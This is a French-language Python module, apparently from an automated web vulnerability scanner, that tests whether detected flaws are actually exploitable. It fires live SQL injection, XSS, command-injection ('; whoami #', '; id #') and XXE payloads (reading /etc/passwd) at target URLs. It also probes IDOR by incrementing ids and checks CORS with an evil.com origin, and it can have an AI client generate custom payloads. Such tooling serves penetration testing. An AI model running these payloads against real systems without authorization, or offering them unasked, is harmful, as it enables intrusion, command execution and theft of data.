"""
Module de test d'exploitation r√©elle des vuln√©rabilit√©s
Teste chaque vuln√©rabilit√© d√©tect√©e pour confirmer qu'elle est r√©ellement exploitable
"""

import asyncio
import time
import re
import json
from typing import Optional, Dict, List, Tuple
from loguru import logger
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.models import Vulnerabilite


class TesteurExploitation:
    """
    Teste r√©ellement l'exploitabilit√© de chaque vuln√©rabilit√© d√©tect√©e
    Utilise l'IA pour g√©n√©rer des exploits personnalis√©s
    """

    def __init__(self, client_ia=None, mode_rapide: bool = False):
        """
        Initialise le testeur d'exploitation
        
        Args:
            client_ia: Client IA (Mistral/OpenAI) pour g√©n√©ration d'exploits personnalis√©s
            mode_rapide: Si True, skip les appels IA lents et utilise payloads de base
        """
        self.timeout = aiohttp.ClientTimeout(total=30)
        self.session = None
        self.client_ia = client_ia
        self.mode_rapide = mode_rapide

    async def tester_exploitation(self, vulnerabilite: Vulnerabilite) -> Tuple[bool, str]:
        """
        Teste si une vuln√©rabilit√© est r√©ellement exploitable
        
        Args:
            vulnerabilite: Vuln√©rabilit√© √† tester
            
        Returns:
            Tuple[bool, str]: (est_exploitable, preuve_exploitation)
        """
        logger.info(f"üß™ Test d'exploitation: {vulnerabilite.type} sur {vulnerabilite.url}")
        
        # Router vers le test appropri√© selon le type
        type_vuln = vulnerabilite.type
        
        if type_vuln == 'Injection SQL':
            return await self._tester_sqli(vulnerabilite)
        elif type_vuln == 'XSS':
            return await self._tester_xss(vulnerabilite)
        elif type_vuln == 'RCE':
            return await self._tester_rce(vulnerabilite)
        elif type_vuln == 'XXE':
            return await self._tester_xxe(vulnerabilite)
        elif type_vuln == 'IDOR':
            return await self._tester_idor(vulnerabilite)
        elif type_vuln == 'CORS':
            return await self._tester_cors(vulnerabilite)
        else:
            # Pour les autres types, utiliser une validation basique
            return await self._tester_generique(vulnerabilite)

    async def _tester_sqli(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """
        Teste r√©ellement une injection SQL
        Utilise l'IA pour g√©n√©rer des payloads personnalis√©s si disponible
        
        Returns:
            Tuple[bool, str]: (exploitable, preuve)
        """
        try:
            # Si IA disponible ET pas en mode rapide, g√©n√©rer des payloads personnalis√©s
            payloads_ia = []
            if self.client_ia and self.client_ia.disponible and not self.mode_rapide:
                try:
                    logger.debug("ü§ñ G√©n√©ration de payloads SQL personnalis√©s avec IA...")
                    # Timeout court pour √©viter les blocages
                    payloads_ia = await asyncio.wait_for(
                        self.client_ia.generer_payloads_sqli(
                            contexte=f"URL: {vuln.url}, Payload original: {vuln.payload}",
                            dbms=None,
                            filtres=None
                        ),
                        timeout=15.0  # Max 15s pour g√©n√©ration IA
                    )
                    if payloads_ia:
                        logger.info(f"‚úÖ {len(payloads_ia)} payloads IA g√©n√©r√©s pour SQLi")
                except asyncio.TimeoutError:
                    logger.debug("‚è±Ô∏è  Timeout g√©n√©ration payloads IA - utilisation payloads de base")
                except Exception as e:
                    logger.debug(f"Erreur g√©n√©ration payloads IA: {str(e)}")
            
            # Extraire le param√®tre vuln√©rable de l'URL
            parsed = urlparse(vuln.url)
            params = parse_qs(parsed.query)
            
            if not params:
                # Essayer avec le payload dans le body si c'est POST
                return await self._tester_sqli_post(vuln)
            
            # Combiner payloads de base et payloads IA
            payloads_base = [
                "' UNION SELECT 1,2,3,4,5-- -",
                "' AND 1=CAST((SELECT version()) AS INT)-- -",
                "' AND SLEEP(5)-- -",
                "' OR 1=1-- -",
                "' OR 1=2-- -"
            ]
            
            all_payloads = payloads_base + payloads_ia[:5]  # Limiter √† 5 payloads IA
            
            # Test 1: Injection UNION pour extraire des donn√©es
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                for payload_union in all_payloads[:3]:  # Tester les 3 premiers
                    url_test = self._construire_url_avec_payload(vuln.url, payload_union)
                    
                    async with session.get(url_test) as resp:
                        contenu = await resp.text()
                        
                        # Chercher des indices d'injection UNION r√©ussie
                        if self._detecter_union_success(contenu):
                            return True, f"Injection UNION r√©ussie - Donn√©es extraites: {contenu[:200]}"
            
            # Test 2: Injection bas√©e sur erreur
            payload_erreur = "' AND 1=CAST((SELECT version()) AS INT)-- -"
            url_test = self._construire_url_avec_payload(vuln.url, payload_erreur)
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(url_test) as resp:
                    contenu = await resp.text()
                    
                    # Chercher des messages d'erreur SQL
                    if self._detecter_erreur_sql(contenu):
                        return True, f"Erreur SQL r√©v√©l√©e: {self._extraire_erreur_sql(contenu)}"
            
            # Test 3: Injection temporelle (SLEEP)
            temps_debut = time.time()
            payload_sleep = "' AND SLEEP(5)-- -"
            url_test = self._construire_url_avec_payload(vuln.url, payload_sleep)
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(url_test) as resp:
                    await resp.text()
            
            temps_ecoule = time.time() - temps_debut
            
            if temps_ecoule >= 4.5:  # Au moins 4.5 secondes (tol√©rance)
                return True, f"Injection temporelle confirm√©e (d√©lai: {temps_ecoule:.2f}s)"
            
            # Test 4: Injection bool√©enne
            payload_true = "' OR 1=1-- -"
            payload_false = "' OR 1=2-- -"
            
            url_true = self._construire_url_avec_payload(vuln.url, payload_true)
            url_false = self._construire_url_avec_payload(vuln.url, payload_false)
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(url_true) as resp_true:
                    contenu_true = await resp_true.text()
                
                async with session.get(url_false) as resp_false:
                    contenu_false = await resp_false.text()
            
            # Comparer les r√©ponses
            if len(contenu_true) != len(contenu_false) or contenu_true != contenu_false:
                return True, "Injection bool√©enne confirm√©e (r√©ponses diff√©rentes)"
            
            return False, "Aucune exploitation r√©ussie"
            
        except Exception as e:
            logger.error(f"Erreur test SQLi: {str(e)}")
            return False, f"Erreur lors du test: {str(e)}"

    async def _tester_sqli_post(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """Teste SQLi sur requ√™te POST"""
        try:
            parsed = urlparse(vuln.url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Essayer avec diff√©rents param√®tres POST
            payload = "' UNION SELECT 1,2,3-- -"
            
            # Param√®tres communs
            params_tests = [
                {'id': payload},
                {'user': payload},
                {'search': payload},
                {'q': payload},
                {'query': payload}
            ]
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                for params in params_tests:
                    async with session.post(base_url, data=params) as resp:
                        contenu = await resp.text()
                        
                        if self._detecter_union_success(contenu) or self._detecter_erreur_sql(contenu):
                            return True, f"Injection SQL POST confirm√©e avec param√®tre: {list(params.keys())[0]}"
            
            return False, "Aucune exploitation POST r√©ussie"
            
        except Exception as e:
            return False, f"Erreur test SQLi POST: {str(e)}"

    async def _tester_xss(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """
        Teste r√©ellement un XSS
        Utilise l'IA pour g√©n√©rer des payloads personnalis√©s si disponible
        
        Returns:
            Tuple[bool, str]: (exploitable, preuve)
        """
        try:
            # Si IA disponible ET pas en mode rapide, g√©n√©rer des payloads XSS personnalis√©s
            payloads_ia = []
            if self.client_ia and self.client_ia.disponible and not self.mode_rapide:
                try:
                    logger.debug("ü§ñ G√©n√©ration de payloads XSS personnalis√©s avec IA...")
                    # Timeout court pour √©viter les blocages
                    payloads_ia = await asyncio.wait_for(
                        self.client_ia.generer_payloads_xss(
                            contexte=f"URL: {vuln.url}, Payload original: {vuln.payload}",
                            filtres=None
                        ),
                        timeout=15.0  # Max 15s pour g√©n√©ration IA
                    )
                    if payloads_ia:
                        logger.info(f"‚úÖ {len(payloads_ia)} payloads IA g√©n√©r√©s pour XSS")
                except asyncio.TimeoutError:
                    logger.debug("‚è±Ô∏è  Timeout g√©n√©ration payloads IA XSS - utilisation payloads de base")
                except Exception as e:
                    logger.debug(f"Erreur g√©n√©ration payloads IA: {str(e)}")
            
            # Payload de test unique pour v√©rifier la r√©flexion
            marqueur_unique = f"XSS_TEST_{int(time.time())}"
            
            # Combiner payloads de base et payloads IA
            payloads_base = [
                f"<script>alert('{marqueur_unique}')</script>",
                f"<iframe src=javascript:alert('{marqueur_unique}')></iframe>",
                f"<img src=x onerror=alert('{marqueur_unique}')>"
            ]
            
            all_payloads = payloads_base + payloads_ia[:5]  # Limiter √† 5 payloads IA
            
            # Tester chaque payload
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                for payload_xss in all_payloads:
                    # Construire l'URL avec le payload
                    url_test = self._construire_url_avec_payload(vuln.url, payload_xss)
                    
                    async with session.get(url_test) as resp:
                        contenu = await resp.text()
                        
                        # V√©rifier si le payload est r√©fl√©chi non √©chapp√©
                        if marqueur_unique in contenu:
                            # V√©rifier si le script est pr√©sent
                            if '<script>' in contenu.lower() or 'alert(' in contenu.lower():
                                return True, f"XSS confirm√© - Payload r√©fl√©chi non √©chapp√©: {payload_xss}"
                    
                    # Test alternatif: iframe
                    payload_iframe = f"<iframe src=javascript:alert('{marqueur_unique}')></iframe>"
                    url_iframe = self._construire_url_avec_payload(vuln.url, payload_iframe)
                    
                    async with session.get(url_iframe) as resp2:
                        contenu2 = await resp2.text()
                        
                        if marqueur_unique in contenu2 and '<iframe' in contenu2.lower():
                            return True, f"XSS confirm√© - iframe r√©fl√©chi: {payload_iframe}"
            
            return False, "XSS non confirm√© - Payload √©chapp√© ou filtr√©"
            
        except Exception as e:
            logger.error(f"Erreur test XSS: {str(e)}")
            return False, f"Erreur lors du test: {str(e)}"

    async def _tester_rce(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """
        Teste r√©ellement un RCE
        
        Returns:
            Tuple[bool, str]: (exploitable, preuve)
        """
        try:
            # Test 1: Commande echo avec marqueur unique
            marqueur = f"RCE_TEST_{int(time.time())}"
            payload_echo = f"; echo {marqueur} #"
            
            url_test = self._construire_url_avec_payload(vuln.url, payload_echo)
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(url_test) as resp:
                    contenu = await resp.text()
                    
                    if marqueur in contenu:
                        return True, f"RCE confirm√© - Commande ex√©cut√©e: echo {marqueur}"
            
            # Test 2: Commande whoami
            payload_whoami = "; whoami #"
            url_test = self._construire_url_avec_payload(vuln.url, payload_whoami)
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(url_test) as resp:
                    contenu = await resp.text()
                    
                    # Chercher des noms d'utilisateur communs dans la r√©ponse
                    users_communs = ['root', 'www-data', 'apache', 'nginx', 'admin']
                    for user in users_communs:
                        if user in contenu.lower():
                            return True, f"RCE confirm√© - Utilisateur d√©tect√©: {user}"
            
            # Test 3: Commande id
            payload_id = "; id #"
            url_test = self._construire_url_avec_payload(vuln.url, payload_id)
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(url_test) as resp:
                    contenu = await resp.text()
                    
                    if 'uid=' in contenu and 'gid=' in contenu:
                        return True, f"RCE confirm√© - Informations syst√®me: {contenu[:200]}"
            
            return False, "RCE non confirm√© - Aucune commande ex√©cut√©e"
            
        except Exception as e:
            logger.error(f"Erreur test RCE: {str(e)}")
            return False, f"Erreur lors du test: {str(e)}"

    async def _tester_xxe(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """Teste r√©ellement un XXE"""
        try:
            # Payload XXE pour lire /etc/passwd
            payload_xxe = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.post(
                    vuln.url,
                    data=payload_xxe,
                    headers={'Content-Type': 'application/xml'}
                ) as resp:
                    contenu = await resp.text()
                    
                    # Chercher des indices de /etc/passwd
                    if 'root:x:' in contenu or 'bin:' in contenu:
                        return True, f"XXE confirm√© - Fichier syst√®me lu: {contenu[:200]}"
            
            return False, "XXE non confirm√©"
            
        except Exception as e:
            logger.error(f"Erreur test XXE: {str(e)}")
            return False, f"Erreur lors du test: {str(e)}"

    async def _tester_idor(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """Teste r√©ellement un IDOR"""
        try:
            # Essayer d'acc√©der √† une ressource avec un ID diff√©rent
            parsed = urlparse(vuln.url)
            path_parts = parsed.path.split('/')
            
            # Chercher des IDs dans le chemin
            for i, part in enumerate(path_parts):
                if part.isdigit():
                    # Essayer avec un ID diff√©rent
                    new_id = str(int(part) + 1)
                    path_parts[i] = new_id
                    new_path = '/'.join(path_parts)
                    new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                    
                    async with aiohttp.ClientSession(timeout=self.timeout) as session:
                        async with session.get(new_url) as resp:
                            if resp.status == 200:
                                contenu = await resp.text()
                                # Si on obtient du contenu, c'est suspect
                                if len(contenu) > 100:
                                    return True, f"IDOR confirm√© - Acc√®s non autoris√© √† ID {new_id}"
            
            return False, "IDOR non confirm√©"
            
        except Exception as e:
            logger.error(f"Erreur test IDOR: {str(e)}")
            return False, f"Erreur lors du test: {str(e)}"

    async def _tester_cors(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """Teste r√©ellement une mauvaise configuration CORS"""
        try:
            origin_malveillant = "https://evil.com"
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(
                    vuln.url,
                    headers={'Origin': origin_malveillant}
                ) as resp:
                    headers = dict(resp.headers)
                    
                    acao = headers.get('Access-Control-Allow-Origin', '')
                    acac = headers.get('Access-Control-Allow-Credentials', '')
                    
                    if acao == '*' or acao == origin_malveillant:
                        if acac.lower() == 'true':
                            return True, f"CORS vuln√©rable confirm√© - Credentials accessibles depuis {origin_malveillant}"
                        return True, f"CORS mal configur√© - Acc√®s depuis {origin_malveillant}"
            
            return False, "CORS non vuln√©rable"
            
        except Exception as e:
            logger.error(f"Erreur test CORS: {str(e)}")
            return False, f"Erreur lors du test: {str(e)}"

    async def _tester_generique(self, vuln: Vulnerabilite) -> Tuple[bool, str]:
        """Test g√©n√©rique pour les autres types de vuln√©rabilit√©s"""
        try:
            # Test basique: v√©rifier si le payload provoque une diff√©rence
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                # R√©ponse normale
                async with session.get(vuln.url) as resp_normal:
                    contenu_normal = await resp_normal.text()
                    status_normal = resp_normal.status
                
                # R√©ponse avec payload
                url_payload = self._construire_url_avec_payload(vuln.url, vuln.payload or "test")
                async with session.get(url_payload) as resp_payload:
                    contenu_payload = await resp_payload.text()
                    status_payload = resp_payload.status
                
                # Si diff√©rence significative, consid√©rer comme exploitable
                if status_normal != status_payload:
                    return True, f"Vuln√©rabilit√© confirm√©e - Status diff√©rent: {status_normal} vs {status_payload}"
                
                if abs(len(contenu_normal) - len(contenu_payload)) > 50:
                    return True, f"Vuln√©rabilit√© confirm√©e - R√©ponse diff√©rente ({len(contenu_normal)} vs {len(contenu_payload)} bytes)"
            
            return False, "Vuln√©rabilit√© non confirm√©e"
            
        except Exception as e:
            logger.error(f"Erreur test g√©n√©rique: {str(e)}")
            return False, f"Erreur lors du test: {str(e)}"

    def _construire_url_avec_payload(self, url: str, payload: str) -> str:
        """Construit une URL avec le payload inject√©"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                # Injecter dans le premier param√®tre
                premier_param = list(params.keys())[0]
                params[premier_param] = [payload]
                new_query = urlencode(params, doseq=True)
                return urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
            else:
                # Pas de param√®tres, ajouter le payload
                separator = '&' if '?' in url else '?'
                return f"{url}{separator}test={payload}"
                
        except Exception as e:
            logger.error(f"Erreur construction URL: {str(e)}")
            return url

    def _detecter_union_success(self, contenu: str) -> bool:
        """D√©tecte si une injection UNION a r√©ussi"""
        # Chercher des patterns indiquant une UNION r√©ussie
        patterns = [
            r'\b\d+\s+\d+\s+\d+\b',  # Nombres s√©par√©s par espaces (colonnes)
            r'UNION.*SELECT',
            r'SELECT.*FROM.*WHERE'
        ]
        
        for pattern in patterns:
            if re.search(pattern, contenu, re.IGNORECASE):
                return True
        
        return False

    def _detecter_erreur_sql(self, contenu: str) -> bool:
        """D√©tecte des messages d'erreur SQL"""
        erreurs_sql = [
            'SQL syntax',
            'mysql_fetch',
            'ORA-',
            'SQLSTATE',
            'PostgreSQL',
            'SQLite',
            'Microsoft SQL Server',
            'SQL error',
            'database error',
            'query failed'
        ]
        
        contenu_lower = contenu.lower()
        for erreur in erreurs_sql:
            if erreur.lower() in contenu_lower:
                return True
        
        return False

    def _extraire_erreur_sql(self, contenu: str) -> str:
        """Extrait le message d'erreur SQL"""
        # Chercher des lignes contenant des erreurs SQL
        lignes = contenu.split('\n')
        for ligne in lignes:
            if any(err in ligne.lower() for err in ['sql', 'error', 'exception', 'failed']):
                return ligne[:200]
        
        return contenu[:200]

